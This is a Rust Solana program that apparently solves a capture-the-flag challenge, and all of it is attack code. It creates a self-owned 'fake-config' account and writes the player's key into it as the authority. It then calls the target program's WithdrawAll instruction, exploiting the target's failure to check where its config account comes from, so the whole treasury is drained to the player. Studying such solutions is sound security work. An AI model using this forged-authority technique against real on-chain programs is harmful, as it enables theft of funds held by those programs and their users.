
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    sysvar::Sysvar,
};

use solana_system_interface::{
    instruction::create_account,
    program as system_program,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let mut iter = accounts.iter();

    let player = next_account_info(&mut iter)?;
    let fake_config = next_account_info(&mut iter)?;
    let treasury = next_account_info(&mut iter)?;
    let challenge_program = next_account_info(&mut iter)?;
    let system = next_account_info(&mut iter)?;

    if !player.is_signer || !player.is_writable {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if !fake_config.is_writable || !treasury.is_writable {
        return Err(ProgramError::InvalidAccountData);
    }

    if system.key != &system_program::ID {
        return Err(ProgramError::IncorrectProgramId);
    }

    // Derive the fake config PDA controlled by this solve program.
    let (expected_config, bump) =
        Pubkey::find_program_address(&[b"fake-config"], program_id);

    if fake_config.key != &expected_config {
        return Err(ProgramError::InvalidSeeds);
    }

    // Create the attacker-controlled config account.
    let bump_seed = [bump];
    let signer_seeds: &[&[u8]] = &[b"fake-config", &bump_seed];

    if fake_config.owner == &system_program::ID
        && fake_config.data_is_empty()
        && fake_config.lamports() == 0
    {
        let rent = Rent::get()?.minimum_balance(32);

        let create_ix = create_account(
            player.key,
            fake_config.key,
            rent,
            32,
            program_id,
        );

        invoke_signed(
            &create_ix,
            &[
                player.clone(),
                fake_config.clone(),
                system.clone(),
            ],
            &[signer_seeds],
        )?;
    }

    // The challenge fails to authenticate the config's provenance.
    // Store our own public key as the configured authority.
    if fake_config.owner != program_id || fake_config.data_len() < 32 {
        return Err(ProgramError::InvalidAccountData);
    }

    fake_config.try_borrow_mut_data()?[..32]
        .copy_from_slice(player.key.as_ref());

    // Invoke WithdrawAll: [0] means withdraw the full treasury balance.
    let withdraw_ix = Instruction {
        program_id: *challenge_program.key,
        accounts: vec![
            AccountMeta::new(*fake_config.key, false),
            AccountMeta::new(*player.key, true),
            AccountMeta::new(*treasury.key, false),
        ],
        data: vec![0],
    };

    invoke(
        &withdraw_ix,
        &[
            fake_config.clone(),
            player.clone(),
            treasury.clone(),
            challenge_program.clone(),
        ],
    )?;

    Ok(())
}
